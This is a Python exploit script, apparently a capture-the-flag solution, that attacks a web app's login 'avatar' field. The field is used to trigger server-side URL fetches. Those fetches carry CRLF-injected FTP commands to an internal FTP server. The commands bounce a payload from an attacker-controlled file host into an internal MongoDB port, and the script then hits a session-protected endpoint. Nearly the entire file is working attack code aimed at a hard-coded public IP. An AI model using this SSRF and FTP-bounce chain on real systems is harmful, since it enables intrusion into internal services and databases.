import requests
import random
import string
import time


PROXIES = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

LOCAL = False
TEST_CONN = False

if LOCAL:
	HOST, PORT = 'X', 5000
	FTP_HOST, FTP_PORT = 'Y', 8877
	MONGO_HOST, MONGO_PORT = 'Z', 27017
else:
	# HOST, PORT = '52.163.52.206', 8088
	HOST, PORT = '23.98.68.11', 8088
	FTP_HOST, FTP_PORT = '172.20.0.2', 8877
	MONGO_HOST, MONGO_PORT = '172.20.0.5', 27017

FILE_SERV_HOST, FILE_SERV_PORT = 'MY HOST', 1234
SESSION = '99999971-1f56-4708-a4aa-2eceb3dcbdd3'
DST_FILENAME = 'tmp'

def get_random_string(n):
	return ''.join(random.choice(string.printable) for i in range(n))

def trigger(url):
	print(f'Triggering urllib.request.urlopen(\'{url}\')')
	print(url.encode())
	username = get_random_string(12)
	r = requests.post(f'http://{HOST}:{PORT}/login', proxies=PROXIES, verify=False, allow_redirects=False, data={
		'username': username,
		'password': username,
		'avatar': url
	})


if TEST_CONN:
	trigger(f'''ftp://{FTP_HOST}:{FTP_PORT}/?q=\r\nUSER fan\r\nPASS root\r\nPORT {FILE_SERV_HOST.replace('.', ',')},0,{FILE_SERV_PORT}\r\nLIST\r\n''')
else:
	trigger(f'''ftp://{FTP_HOST}:{FTP_PORT}/?q=\r\nUSER fan\r\nPASS root\r\nPORT {FILE_SERV_HOST.replace('.', ',')},0,{FILE_SERV_PORT}\r\nSTOR {DST_FILENAME}\r\n''')
	input()
	trigger(f'''ftp://{FTP_HOST}:{FTP_PORT}/?q=\r\nUSER fan\r\nPASS root\r\nPORT {MONGO_HOST.replace('.', ',')},0,{MONGO_PORT}\r\nRETR {DST_FILENAME}\r\n''')
	input()
	requests.get(f'http://{HOST}:{PORT}/shake_and_dice', proxies=PROXIES, verify=False, allow_redirects=False, cookies={'session': SESSION})
